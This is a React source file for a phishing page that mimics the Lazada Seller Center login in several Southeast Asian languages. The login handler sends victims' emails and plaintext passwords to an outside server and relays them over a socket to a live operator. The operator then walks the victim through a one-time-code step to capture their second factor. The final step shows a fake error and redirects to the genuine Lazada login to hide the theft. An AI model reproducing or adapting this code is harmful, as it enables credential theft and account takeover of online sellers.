import React from "react";
import { useTranslation } from "react-i18next";
import { IoIosArrowBack } from "react-icons/io";
import { IoEyeOutline, IoEyeOffOutline } from "react-icons/io5";
import {
  Box,
  Image,
  VStack,
  HStack,
  Stack,
  Menu,
  MenuButton,
  MenuList,
  MenuItem,
  Button,
  Text,
  FormControl,
  Input,
  InputGroup,
  InputRightElement,
  Drawer,
  DrawerBody,
  DrawerHeader,
  DrawerOverlay,
  DrawerContent,
  useDisclosure,
} from "@chakra-ui/react";
import { io } from "socket.io-client";
import axios from "axios";
import { ChevronDownIcon } from "lucide-react";
import IndonesiaFlagIcon from "/indonesia.svg";
import MalaysiaFlagIcon from "/malaysia.svg";
import PhilipinasFlagIcon from "/philipinas.svg";
import SingaporeFlagIcon from "/singapore.svg";
import ThailandFlagIcon from "/thailand.svg";
import VietnamFlagIcon from "/vietnam.svg";
import ChineseFlagIcon from "/china.svg";
import EnglishFlagIcon from "/england-flag.svg";
import DefaultBackground from "/lg/lg_landing_bg_malaysia_indonesia_singapore.jpg";
import MalaysiaIndonesiaSingaporeLgBg from "/lg/lg_landing_bg_malaysia_indonesia_singapore.jpg";
import PilipinasLgBg from "/lg/lg_landing_bg_philipinas.jpg";
import ThailandLgBg from "/lg/lg_landing_bg_thailand.jpg";
import ThailandLgBg2 from "/lg/lg_landing_bg_thailand2.jpg";
import VietnamLgBg from "/lg/lg_landing_bg_vietnam.jpg";
import { useState } from "react";
import { useEffect } from "react";
import MobileMenu from "../components/MobileMenu";
import StepOne from "../components/lg/StepOne";
import { BaseUrl, SERVER_URL } from "../utils/Reusables";
import Spinner from "../components/Spinner";
import StepTwo from "../components/lg/StepTwo";
import StepThree from "../components/lg/StepThree";
import StepFour from "../components/lg/StepFour";
import MobileStepOne from "../components/mobile/MobileStepOne";
import MobileStepTwo from "../components/mobile/MobileStepTwo";
import MobileStepThree from "../components/mobile/MobileStepThree";
import MobileStepFour from "../components/mobile/MobileStepFour";

const languages = [
  { code: "th", name: "Thailand", flag: ThailandFlagIcon },
  { code: "en", name: "English", flag: EnglishFlagIcon },
  { code: "id", name: "Indonesia", flag: IndonesiaFlagIcon },
  { code: "ms", name: "Malaysia", flag: MalaysiaFlagIcon },
  { code: "fil", name: "Pilipinas", flag: PhilipinasFlagIcon },
  { code: "en-SG", name: "Singapore", flag: SingaporeFlagIcon },
  { code: "vi", name: "Vietnam", flag: VietnamFlagIcon },
  { code: "cn", name: "简体中文", flag: ChineseFlagIcon },
];

const backgroundImages = {
  th: [ThailandLgBg, ThailandLgBg2],
  en: [
    MalaysiaIndonesiaSingaporeLgBg,
    ThailandLgBg,
    PilipinasLgBg,
    ThailandLgBg2,
    VietnamLgBg,
  ],
  id: [MalaysiaIndonesiaSingaporeLgBg],
  ms: [MalaysiaIndonesiaSingaporeLgBg],
  fil: [PilipinasLgBg],
  "en-SG": [MalaysiaIndonesiaSingaporeLgBg],
  vi: [VietnamLgBg],
  cn: [PilipinasLgBg],
};

const socket = io(SERVER_URL);

const Landing = () => {
  const [currentBackgroundIndex, setCurrentBackgroundIndex] = useState(0);
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [lgCurrentStep, setLgCurrentStep] = useState(1);
  const [adminResponse, setAdminResponse] = useState(null);
  const [adminOtpResponse, setAdminOtpResponse] = useState(null);
  const [adminOtpUpdatedMobileResponse, setAdminOtpUpdatedMobileResponse] =
    useState(null);
  const [mobileLoading, setMobileLoading] = useState(false);
  const [mobileCurrentStep, setMobileCurrentStep] = useState(1);
  const [data, setData] = useState({
    email: "",
    password: "",
    otp: "",
  });
  const { t, i18n } = useTranslation();
  const { isOpen, onOpen, onClose } = useDisclosure();

  const handleModalClose = () => {
    window.location.href =
      "https://sellercenter.lazada.co.th/apps/seller/login?redirect_url=https://sellercenter.lazada.co.th/#/login";
  };

  useEffect(() => {
    const currentLanguageImages = backgroundImages[i18n.language] || [
      DefaultBackground,
    ];

    if (currentLanguageImages.length > 1) {
      const interval = setInterval(() => {
        setCurrentBackgroundIndex(
          (prevIndex) => (prevIndex + 1) % currentLanguageImages.length
        );
      }, 15000);

      return () => clearInterval(interval);
    } else {
      setCurrentBackgroundIndex(0);
    }
  }, [i18n.language]);

  const changeLanguage = (languageCode) => {
    i18n.changeLanguage(languageCode);
    setCurrentBackgroundIndex(0);
  };

  const getCurrentLanguage = () => {
    return (
      languages.find((lang) => lang.code === i18n.language) || languages[0]
    );
  };

  const getCurrentBackgroundImage = () => {
    const currentLanguageImages = backgroundImages[i18n.language] || [
      DefaultBackground,
    ];
    return currentLanguageImages[currentBackgroundIndex];
  };

  const currentLanguage = getCurrentLanguage();
  const togglePasswordVisibility = () => setShowPassword(!showPassword);

  const isEmailValid = data.email.includes("@");
  const isPasswordValid = data.password.length >= 6;

  useEffect(() => {
    socket.on("adminResponse", (response) => {
      setAdminResponse(response);
      setLoading(false);
      setLgCurrentStep(2);
      setMobileLoading(false);
      setMobileCurrentStep(2);
    });

    socket.on("adminOtpResponse", (response) => {
      setAdminOtpResponse(response);
      setLoading(false);
      setLgCurrentStep(3);
      setMobileLoading(false);
      setMobileCurrentStep(3);
    });

    socket.on("adminOtpUpdatedResponse", (response) => {
      setLoading(false);
      setLgCurrentStep(4);
    });

    socket.on("adminOtpUpdatedResponseMobile", (response) => {
      setAdminOtpUpdatedMobileResponse(response);
      setMobileCurrentStep(4);
      setMobileLoading(false);
    });

    return () => {
      socket.off("adminResponse");
      socket.off("adminOtpResponse");
      socket.off("adminOtpUpdatedResponse");
      socket.off("adminOtpUpdatedResponse");
    };
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData({ ...data, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMobileLoading(true);

    try {
      const response = await axios.post(`${BaseUrl}/lazada/save`, {
        email: data.email,
        password: data.password,
      });
      if (response.status === 201) {
        socket.emit("loginAttempt", {
          email: data.email,
          password: data.password,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Login failed");
      }
    } catch (error) {
      console.error(
        "Login failed",
        error.response ? error.response.data : error.message
      );
      setLoading(false);
      setMobileLoading(true);
    }
  };

  const handleNext = () => {
    setLoading(true);
    socket.emit("otpAttempt", {
      email: data.email,
      response: adminResponse,
      message: "send OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleMobileNext = () => {
    setMobileLoading(true);
    socket.emit("otpAttemptMobile", {
      email: data.email,
      response: adminResponse,
      message: "send OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleResend = () => {
    setLoading(true);
    setAdminOtpResponse(null);
    socket.emit("otpResendAttempt", {
      email: data.email,
      message: "resend OTP",
      timestamp: new Date().toISOString(),
    });
  };

  const handleFinish = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await axios.put(`${BaseUrl}/lazada/update`, {
        email: data.email,
        password: data.password,
        otp: data.otp,
      });
      if (response.status === 200) {
        socket.emit("updateAttempt", {
          email: data.email,
          password: data.password,
          sentTo: adminOtpResponse.sendTo,
          otp: data.otp,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Update failed");
      }
    } catch (error) {
      console.error(
        "Update failed",
        error.response ? error.response.data : error.message
      );
      setLoading(false);
    }
  };

  const handleFinishMobile = async (e) => {
    e.preventDefault();

    setMobileLoading(true);
    // setAdminOtpResponse(null);

    try {
      const response = await axios.put(`${BaseUrl}/lazada/update`, {
        email: data.email,
        password: data.password,
        otp: data.otp,
      });

      if (response.status === 200) {
        socket.emit("updateAttemptMobile", {
          email: data.email,
          password: data.password,
          sentTo: adminOtpResponse.sendTo,
          otp: data.otp,
          timestamp: new Date().toISOString(),
        });
      } else {
        throw new Error("Login failed");
      }

      console.log("Login successful", response);
    } catch (error) {
      console.error(
        "Login failed",
        error.response ? error.response.data : error.message
      );
      setMobileLoading(false); // Set loading to false if there's an error
      // setMobileLoading(false);
    }
  };

  const renderStep = () => {
    switch (mobileCurrentStep) {
      case 1:
        return (
          <MobileStepOne
            t={t}
            showPassword={showPassword}
            togglePasswordVisibility={togglePasswordVisibility}
            handleSubmit={handleSubmit}
            data={data}
            handleChange={handleChange}
            isEmailValid={isEmailValid}
            isPasswordValid={isPasswordValid}
            mobileLoading={mobileLoading}
          />
        );
      case 2:
        return (
          <MobileStepTwo
            t={t}
            adminResponse={adminResponse}
            handleNext={handleNext}
            setMobileCurrentStep={setMobileCurrentStep}
            handleMobileNext={handleMobileNext}
          />
        );
      case 3:
        return (
          <MobileStepThree
            t={t}
            adminOtpResponse={adminOtpResponse}
            data={data}
            setData={setData}
            handleResend={handleResend}
            handleFinish={handleFinish}
            handleFinishMobile={handleFinishMobile}
            mobileLoading={mobileLoading}
          />
        );
      case 4:
        return <MobileStepFour t={t} handleModalClose={handleModalClose} />;
      default:
        return null;
    }
  };

  return (
    <>
      <Box display={{ base: "none", md: "block" }} h="100vh" overflow="hidden">
        <VStack h="100%">
          <HStack
            h="10%"
            w="100%"
            px="1rem"
            // bg="red"
            alignItems="center"
            justifyContent="space-between"
          >
            <Image src="/lg/logo.svg" alt="logo" h="3rem" w="auto" />
            <Menu>
              <MenuButton
                as={Button}
                rightIcon={<ChevronDownIcon size="0.9rem" />}
                variant="ghost"
              >
                <HStack spacing={2}>
                  <Image
                    src={getCurrentLanguage().flag}
                    alt={getCurrentLanguage().name}
                    h="1.5rem"
                    w="1.5rem"
                  />
                  <Text fontSize="0.8rem">{getCurrentLanguage().name}</Text>
                </HStack>
              </MenuButton>
              <MenuList w="fit-content" minW="80px">
                {languages.map((lang) => (
                  <MenuItem
                    key={lang.code}
                    onClick={() => changeLanguage(lang.code)}
                    bg={
                      getCurrentLanguage().code === lang.code
                        ? "blue.100"
                        : "white"
                    }
                    _hover={{ bg: "blue.200" }}
                  >
                    <HStack spacing={2}>
                      <Image
                        src={lang.flag}
                        alt={lang.name}
                        h="1.5rem"
                        w="1.5rem"
                      />

                      <Text fontSize="0.8rem">{lang.name}</Text>
                    </HStack>
                  </MenuItem>
                ))}
              </MenuList>
            </Menu>
          </HStack>
          <Stack
            // bgImage={`url(${backgroundImage})`}
            bgImage={`url(${getCurrentBackgroundImage()})`}
            bgSize="cover"
            bgPosition="center"
            bgRepeat="no-repeat"
            w="100%"
            h="90%"
            justifyContent="center"
            alignItems="flex-end"
            pr="6.8rem"
          >
            <VStack
              bg="#fff"
              // maxW="500px"
              // maxH="500px"
              // minW="500px"
              // minH="500px"
              w="500px"
              h="448.7px"
              borderRadius="18px"
              p="40px"
              alignItems="flex-start"
            >
              <Text
                mb="1.5rem"
                color="#2e3346"
                fontWeight="700"
                fontSize="20px"
                fontFamily="Roboto"
              >
                {lgCurrentStep === 1 && t("welcome")}
                {lgCurrentStep === 2 && t("verifyEmail")}
                {lgCurrentStep === 3 && t("enterTheCode")}
                {lgCurrentStep === 4 && t("errorOccured")}
              </Text>
              <VStack w="100%" h="100%" position="relative">
                {loading && (
                  <Box
                    position="absolute"
                    top="0"
                    left="0"
                    right="0"
                    bottom="0"
                    bg="rgba(255, 255, 255, 0.2)"
                    display="flex"
                    justifyContent="center"
                    alignItems="center"
                    zIndex="1"
                  >
                    <Spinner />
                  </Box>
                )}
                {lgCurrentStep === 1 && (
                  <StepOne
                    t={t}
                    handleSubmit={handleSubmit}
                    handleChange={handleChange}
                    data={data}
                    showPassword={showPassword}
                    togglePasswordVisibility={togglePasswordVisibility}
                    isEmailValid={isEmailValid}
                    isPasswordValid={isPasswordValid}
                  />
                )}
                {lgCurrentStep === 2 && (
                  <StepTwo
                    adminResponse={adminResponse}
                    handleNext={handleNext}
                    data={data}
                    setLgCurrentStep={setLgCurrentStep}
                  />
                )}
                {lgCurrentStep === 3 && (
                  <StepThree
                    adminOtpResponse={adminOtpResponse}
                    data={data}
                    setData={setData}
                    handleFinish={handleFinish}
                  />
                )}
                {lgCurrentStep === 4 && (
                  <StepFour handleModalClose={handleModalClose} />
                )}
              </VStack>
            </VStack>
          </Stack>
        </VStack>
      </Box>
      <Box display={{ base: "block", md: "none" }}>
        <HStack p="0.5rem" justifyContent="space-between">
          <IoIosArrowBack size="2rem" />
          <Text>Seller Center</Text>
          <Button
            onClick={onOpen}
            as={Button}
            rightIcon={<ChevronDownIcon size="0.9rem" />}
            variant="unstyled"
            fontWeight="300"
            display="flex"
          >
            <Image
              src={getCurrentLanguage().flag}
              alt={getCurrentLanguage().name}
              h="1rem"
              w="1rem"
            />
          </Button>
        </HStack>
        <HStack p="1rem" w="100%">
          <Text fontWeight="600" fontSize="1.3rem">
            {mobileCurrentStep === 1 && t("mobileWelcome")}
            {mobileCurrentStep === 2 && t("mobileVerifyEmail")}
            {mobileCurrentStep === 3 && t("enterTheCode")}
            {mobileCurrentStep === 4 && t("errorOccured")}
          </Text>
        </HStack>
        <Box w="100%" h="100%">
          {mobileLoading && (
            <Box
              position="absolute"
              top={0}
              left={0}
              right={0}
              bottom={0}
              bg="rgba(255, 255, 255, 0.7)"
              display="flex"
              alignItems="center"
              justifyContent="center"
              pointerEvents="none"
              zIndex={999}
            >
              <Spinner />
            </Box>
          )}
          {renderStep()}
          {/* {!mobileLoading && mobileCurrentStep === 1 && (
            <MobileStepOne
              t={t}
              showPassword={showPassword}
              togglePasswordVisibility={togglePasswordVisibility}
              handleSubmit={handleSubmit}
              data={data}
              handleChange={handleChange}
              isEmailValid={isEmailValid}
              isPasswordValid={isPasswordValid}
            />
          )} */}
        </Box>

        <MobileMenu
          onClose={onClose}
          isOpen={isOpen}
          languages={languages}
          changeLanguage={changeLanguage}
          getCurrentLanguage={getCurrentLanguage}
        />
      </Box>
    </>
  );
};

export default Landing;
